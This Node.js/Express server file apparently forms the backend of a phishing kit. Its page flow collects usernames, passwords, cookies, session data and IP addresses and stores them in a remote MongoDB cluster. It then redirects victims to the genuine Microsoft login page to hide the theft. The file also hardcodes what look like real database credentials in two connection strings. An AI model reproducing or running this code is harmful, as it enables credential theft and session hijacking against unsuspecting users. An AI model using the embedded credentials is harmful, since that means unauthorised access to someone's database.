require('dotenv').config();
let express = require("express");
let bodyParser = require("body-parser");
let ejs = require("ejs");
let mongoose = require("mongoose");
let http = require('http');
const mongodb = require('mongodb');
const cookieParser = require('cookie-parser');
const session = require('express-session');
const MongoStore = require('connect-mongo');

let app = express();

app.set("view engine", "ejs")
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));
app.use (cookieParser());
app.use(session({  name: 'session&cookie',
    secret: 'then',
    httpOnly: true,
    secure: true,
    maxAge: 1000 * 60 * 60 * 24 * 90,
    resave: false,
    saveUninitialized: true,
    store: MongoStore.create({
        mongoUrl:'mongodb+srv://sgrain35:SDdqnJVhOqYWLyMT@cluster0.cbrwrem.mongodb.net/full'
})}));

mongoose.set('strictQuery', true);
mongoose.connect("mongodb+srv://sgrain35:SDdqnJVhOqYWLyMT@cluster0.cbrwrem.mongodb.net/full",{ useNewUrlParser:true });

const userSchema = new mongoose.Schema({
  ai: String,
  pi: String,
  cook:Object,
  ip:String,
  session:Object,
});

const User = new mongoose.model("User", userSchema);

app.get("/", (req, res) => {
  let username = req.query.username;
  res.render("recap", { username: username });
});

app.post("/", function(req, res) {
let username = req.body.recapstore;
res.render("first", { username: username });
});

app.post("/first", function(req, res) {
    var header= req.headers;
  var username = req.body.username;
  res.render("second", {username: username});
    console.log(header);
});

app.post("/second", function(req, res) {
  const ipadd = "IP address is: " + req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  var username = req.body.username;
  var cook = req.session.cookies = req.cookies;

  const newUser = new User({
    ai: req.body.username,
    pi: req.body.pass,
    cook: req.session.cookies = req.cookies,
    ip: ipadd,
    session: req.session,
  });

  newUser.save(function(err) {
    if (err) {
      console.log(err);
    } else {
      res.render("third", {
        username: username
      });
    }
  });
});

app.post("/third", function(req, res) {
  const ipadd = "IP address is: " + req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  var username = req.body.username;
  var cook = req.session.cookies = req.cookies;

  const newUser = new User({
    ai: req.body.username,
    pi: req.body.pass,
    cook: req.session.cookies = req.cookies,
    ip: ipadd,
    session: req.session,
  });

  newUser.save(function(err) {
    if (err) {
      console.log(err);
    } else {
      res.redirect("https://login.microsoftonline.com/");
    }
  });
});


let port = process.env.PORT;
if (port == null || port == "") {
  port = 3000
};

app.listen(process.env.PORT || 3000, function() {
  console.log("welcome to 3k")
});
